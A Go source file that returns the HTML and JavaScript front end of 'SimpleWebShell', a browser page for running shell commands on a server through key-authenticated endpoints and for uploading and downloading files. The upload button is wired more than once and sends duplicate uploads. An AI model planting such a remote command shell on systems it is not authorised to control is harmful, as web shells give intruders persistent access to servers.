package pages

// 获取WebShell界面HTML
func GetWebShellHTML() string {
	return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SimpleWebShell 1.1.20260225</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #569cd6;
            text-align: center;
            margin-bottom: 30px;
        }
        .command-section {
            background-color: #252526;
            border: 1px solid #3e3e42;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .input-group {
            display: flex;
            margin-bottom: 10px;
        }
        input[type="text"] {
            flex: 1;
            background-color: #3c3c3c;
            border: 1px solid #6c6c6c;
            color: #d4d4d4;
            padding: 8px 12px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        button {
            background-color: #007acc;
            border: none;
            color: white;
            padding: 8px 16px;
            margin-left: 10px;
            border-radius: 3px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        button:hover {
            background-color: #005a9e;
        }
        .output {
            background-color: #0c0c0c;
            border: 1px solid #3e3e42;
            border-radius: 3px;
            padding: 15px;
            height: 500px; /* 固定高度为原来的 max-height，内部使用 overflow-y 实现滚动 */
            white-space: pre-wrap;
            font-size: 14px;
            overflow-y: auto;
            margin-bottom: 24px; /* 与下方 file-section 间距统一且更大 */
            /* max-height: 500px;  已改为固定高度 */
        }
        .method-select, .format-select {
            background-color: #3c3c3c;
            border: 1px solid #6c6c6c;
            color: #d4d4d4;
            padding: 8px;
            margin-left: 10px;
            border-radius: 3px;
        }
        .file-section {
            background-color: #252526;
            border: 1px solid #3e3e42;
            border-radius: 5px;
            padding: 20px;
            margin-top: 0; /* 取消顶部外边距，间距由上方元素的 margin-bottom 决定，保证一致 */
            margin-bottom: 24px; /* 增大并与上方输出框间距统一 */
        }
        .progress {
            width: 100%;
            background-color: #3c3c3c;
            border-radius: 3px;
            overflow: hidden;
            height: 16px;
            margin-top: 8px;
        }
        .progress > div {
            height: 100%;
            background-color: #0e639c;
            width: 0%;
            transition: width 0.2s linear;
        }
        .small {
            font-size: 12px;
            color: #9a9a9a;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SimpleWebShell 1.1.20260225 By FasterEdge</h1>
        
        <div class="command-section">
            <div class="input-group">
                <input type="text" id="command" placeholder="输入要执行的命令..." onkeypress="handleKeyPress(event)">
                <select id="method" class="method-select" onchange="toggleFormatSelect()">
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                </select>
                <select id="format" class="format-select">
                    <option value="json">JSON</option>
                    <option value="form">Form</option>
                </select>
                <button onclick="executeCommand()">执行</button>
                <button onclick="clearOutput()">清空</button>
            </div>
        </div>

        <div class="output" id="output">欢迎使用 SimpleWebShell
请在上方输入框中输入要执行的命令，然后点击执行按钮或按回车键。
支持GET请求和POST请求（JSON/Form格式）。
        </div>

        <div class="file-section">
            <h3>文件上传</h3>
            <div class="input-group">
                <input type="file" id="uploadFile">
                <button id="uploadBtn">上传</button>
                <button id="cancelUploadBtn">取消</button>
            </div>
            <div class="small" id="uploadStatus">未上传</div>
            <div class="progress"><div id="uploadProgress"></div></div>
        </div>

        <div class="file-section">
            <h3>文件下载</h3>
            <div class="input-group">
                <input type="text" id="downloadPath" placeholder="输入要下载的文件名，例如 a.txt">
                <button id="downloadBtn">下载</button>
                <button id="cancelDownloadBtn">取消</button>
            </div>
            <div class="small" id="downloadStatus">未开始</div>
            <div class="progress"><div id="downloadProgress"></div></div>
        </div>
    </div>

    <script>
        function handleKeyPress(event) {
            if (event.key === 'Enter') {
                executeCommand();
            }
        }

        function toggleFormatSelect() {
            const method = document.getElementById('method').value;
            const formatSelect = document.getElementById('format');
            
            if (method === 'GET') {
                formatSelect.style.display = 'none';
            } else {
                formatSelect.style.display = 'inline-block';
            }
        }

        // 页面加载时初始化格式选择框的显示状态
        window.onload = function() {
            toggleFormatSelect();
            setupUpload();
            setupDownload();
        }

        function executeCommand() {
            const command = document.getElementById('command').value.trim();
            const method = document.getElementById('method').value;
            const format = document.getElementById('format').value;
            const output = document.getElementById('output');
            
            if (!command) {
                alert('请输入命令');
                return;
            }

            output.textContent += '\n$ ' + command + '\n';
            
            const key = new URLSearchParams(window.location.search).get('key');
            
            if (method === 'GET') {
                fetch('/get?key=' + encodeURIComponent(key) + '&cmd=' + encodeURIComponent(command))
                    .then(response => response.text())
                    .then(data => {
                        output.textContent += data + '\n';
                        output.scrollTop = output.scrollHeight;
                    })
                    .catch(error => {
                        output.textContent += '错误: ' + error + '\n';
                        output.scrollTop = output.scrollHeight;
                    });
            } else {
                let fetchOptions = {
                    method: 'POST'
                };
                
                if (format === 'json') {
                    // JSON格式
                    fetchOptions.headers = {
                        'Content-Type': 'application/json'
                    };
                    fetchOptions.body = JSON.stringify({
                        key: key,
                        cmd: command
                    });
                } else {
                    // 表单格式
                    const formData = new FormData();
                    formData.append('key', key);
                    formData.append('cmd', command);
                    fetchOptions.body = formData;
                }
                
                fetch('/post', fetchOptions)
                    .then(response => response.text())
                    .then(data => {
                        output.textContent += data + '\n';
                        output.scrollTop = output.scrollHeight;
                    })
                    .catch(error => {
                        output.textContent += '错误: ' + error + '\n';
                        output.scrollTop = output.scrollHeight;
                    });
            }
            
            document.getElementById('command').value = '';
        }

        function clearOutput() {
            document.getElementById('output').textContent = '输出已清空。\n';
        }

        // Upload helpers
        let uploadController = null;
        function setupUpload() {
            const uploadBtn = document.getElementById('uploadBtn');
            const cancelBtn = document.getElementById('cancelUploadBtn');
            const fileInput = document.getElementById('uploadFile');
            const status = document.getElementById('uploadStatus');
            const progressBar = document.getElementById('uploadProgress');

            uploadBtn.onclick = async function() {
                const file = fileInput.files[0];
                const key = new URLSearchParams(window.location.search).get('key');
                if (!file) { alert('请选择文件'); return; }
                if (!key) { alert('URL 中未包含 key 参数'); return; }

                uploadController = new AbortController();
                const signal = uploadController.signal;

                status.textContent = '上传中...';
                progressBar.style.width = '0%';

                try {
                    // 构建 multipart 协议体并使用 fetch 上传
                    const form = new FormData();
                    form.append('file', file, file.name);
                    form.append('key', key);

                    const resp = await fetch('/file_send?key=' + encodeURIComponent(key), {
                        method: 'POST',
                        body: form,
                        signal: signal
                    });

                    const text = await resp.text();
                    if (!resp.ok) {
                        status.textContent = '上传失败: ' + text;
                    } else {
                        status.textContent = '上传完成';
                        progressBar.style.width = '100%';
                    }
                } catch (err) {
                    if (err.name === 'AbortError') {
                        status.textContent = '上传已取消';
                    } else {
                        status.textContent = '上传出错: ' + err;
                    }
                } finally {
                    uploadController = null;
                }
            };

            cancelBtn.onclick = function() {
                if (uploadController) {
                    uploadController.abort();
                }
            };

            // 进度 UI：我们无法直接从 fetch 获取进度，但可以使用 XMLHttpRequest for upload progress
            fileInput.onchange = function() {
                progressBar.style.width = '0%';
                status.textContent = '准备上传: ' + (fileInput.files[0] ? fileInput.files[0].name : '');
            };

            // Attach a separate XHR-based uploader for progress reporting
            uploadBtn.addEventListener('click', function(xhrEv) {
                // Prevent double-trigger when using fetch path above
            });

            // Provide a more accurate uploader using XHR
            uploadBtn.addEventListener('click', function() {
                const file = fileInput.files[0];
                const key = new URLSearchParams(window.location.search).get('key');
                if (!file || !key) return;

                // Use XHR to get progress events
                const xhr = new XMLHttpRequest();
                xhr.open('POST', '/file_send?key=' + encodeURIComponent(key));
                const form = new FormData();
                form.append('file', file, file.name);
                form.append('key', key);

                xhr.upload.onprogress = function(e) {
                    if (e.lengthComputable) {
                        const percent = (e.loaded / e.total) * 100;
                        progressBar.style.width = percent + '%';
                        status.textContent = '上传中: ' + Math.round(percent) + '%';
                    }
                };

                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        status.textContent = '上传完成';
                        progressBar.style.width = '100%';
                    } else {
                        status.textContent = '上传失败: ' + xhr.responseText;
                    }
                };

                xhr.onerror = function() { status.textContent = '上传错误'; };
                xhr.onabort = function() { status.textContent = '上传已取消'; };

                xhr.send(form);

                // wire cancellation
                cancelBtn.onclick = function() { xhr.abort(); };
            });
        }

        // Download helpers
        let downloadController = null;
        function setupDownload() {
            const downloadBtn = document.getElementById('downloadBtn');
            const cancelBtn = document.getElementById('cancelDownloadBtn');
            const pathInput = document.getElementById('downloadPath');
            const status = document.getElementById('downloadStatus');
            const progressBar = document.getElementById('downloadProgress');

            downloadBtn.onclick = async function() {
                const filename = pathInput.value.trim();
                const key = new URLSearchParams(window.location.search).get('key');
                if (!filename) { alert('请输入文件名'); return; }
                if (!key) { alert('URL 中未包含 key 参数'); return; }

                // Use fetch with AbortController and stream the response to show progress
                downloadController = new AbortController();
                const signal = downloadController.signal;
                status.textContent = '准备下载...';
                progressBar.style.width = '0%';

                try {
                    const resp = await fetch('/file_receive?key=' + encodeURIComponent(key) + '&path=' + encodeURIComponent(filename), { signal });
                    if (!resp.ok) {
                        const txt = await resp.text();
                        status.textContent = '下载失败: ' + txt;
                        return;
                    }

                    const contentLength = resp.headers.get('Content-Length');
                    const total = contentLength ? parseInt(contentLength, 10) : null;

                    const reader = resp.body.getReader();
                    const chunks = [];
                    let received = 0;

                    while (true) {
                        const { done, value } = await reader.read();
                        if (done) break;
                        chunks.push(value);
                        received += value.length;
                        if (total) {
                            const percent = (received / total) * 100;
                            progressBar.style.width = percent + '%';
                            status.textContent = '下载中: ' + Math.round(percent) + '%';
                        } else {
                            // 不能得知总大小时显示字节数
                            status.textContent = '下载中: ' + received + ' bytes';
                        }
                    }

                    // 合并并触发保存
                    const blob = new Blob(chunks);
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = filename;
                    document.body.appendChild(a);
                    a.click();
                    a.remove();
                    URL.revokeObjectURL(url);

                    status.textContent = '下载完成';
                    progressBar.style.width = '100%';

                } catch (err) {
                    if (err.name === 'AbortError') {
                        status.textContent = '下载已取消';
                    } else {
                        status.textContent = '下载出错: ' + err;
                    }
                } finally {
                    downloadController = null;
                }
            };

            cancelBtn.onclick = function() {
                if (downloadController) downloadController.abort();
            };
        }
    </script>
</body>
</html>`
}
